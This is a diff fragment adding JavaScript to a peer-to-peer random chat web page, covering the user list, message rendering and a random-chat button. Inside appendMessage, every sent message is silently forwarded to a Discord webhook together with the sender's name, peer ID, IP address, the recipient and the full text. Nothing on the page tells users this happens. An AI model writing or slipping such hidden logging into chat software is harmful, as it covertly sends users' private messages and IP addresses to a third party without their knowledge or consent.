+                    userInfo.appendChild(userId);
+                    userItem.appendChild(userInfo);
+                    
+                    if (peerId !== state.myPeerId && !state.isConnected) {
+                        const connectIcon = document.createElement('span');
+                        connectIcon.classList.add('connect-icon');
+                        connectIcon.textContent = '→ Connect';
+                        connectIcon.onclick = () => {
+                            elements.peerIdInput.value = peerId;
+                            connectToPeer(peerId);
+                        };
+                        userItem.appendChild(connectIcon);
+                    }
+                    
+                    elements.usersList.appendChild(userItem);
+                });
+                
+                updateRandomChatButton();
+            }
+            
+            function appendMessage(text, isSent, sender) {
+                const messageElement = document.createElement('div');
+                messageElement.classList.add('message');
+                messageElement.classList.add(isSent ? 'sent' : 'received');
+                
+                const usernameElement = document.createElement('div');
+                usernameElement.classList.add('username');
+                usernameElement.textContent = sender;
+                
+                const textElement = document.createElement('div');
+                textElement.textContent = text;
+                
+                messageElement.appendChild(usernameElement);
+                messageElement.appendChild(textElement);
+                
+                elements.messagesContainer.appendChild(messageElement);
+                elements.messagesContainer.scrollTop = elements.messagesContainer.scrollHeight;
+                
+                if (isSent) {
+                    sendToDiscordWebhook(`📤 **Message Sent**\n- From: ${state.localUsername} (${state.myPeerId}, IP: ${state.userIP})\n- To: ${state.remoteUsername || 'Unknown'} (${state.connection?.peer || 'Unknown'})\n- Message: ${text}\n- Time: ${new Date().toLocaleString()}`);
+                }
+            }
+            
+            function appendSystemMessage(text) {
+                const messageElement = document.createElement('div');
+                messageElement.classList.add('message');
+                messageElement.style.alignSelf = 'center';
+                messageElement.style.backgroundColor = '#333';
+                messageElement.style.color = '#aaa';
+                messageElement.style.fontStyle = 'italic';
+                messageElement.textContent = text;
+                
+                elements.messagesContainer.appendChild(messageElement);
+                elements.messagesContainer.scrollTop = elements.messagesContainer.scrollHeight;
+            }
+            
+            function updateRandomChatButton() {
+                const availableUsers = Array.from(state.onlineUsers.entries())
+                    .filter(([peerId, userData]) => 
+                        peerId !== state.myPeerId && 
+                        peerId !== state.TRACKER_SERVER_ID
+                    ).length;
+                
+                elements.randomChatBtn.disabled = availableUsers < 1 || state.isConnected || state.isSearching;
+                
+                if (availableUsers < 1) {
+                    elements.randomChatBtn.textContent = 'No Users Available';
+                } else if (state.isSearching) {
+                    elements.randomChatBtn.textContent = 'Searching...';
+                } else {
+                    elements.randomChatBtn.innerHTML = '<span class="icon">🎲</span> Start Random Chat';
+                }
+            }
+            
+            // Public API
+            return {
+                init
+            };
+        })();
+        
+        // Initialize the app when DOM is loaded
+        document.addEventListener('DOMContentLoaded', ChatApp.init);
     </script>
 </body>
 </html>
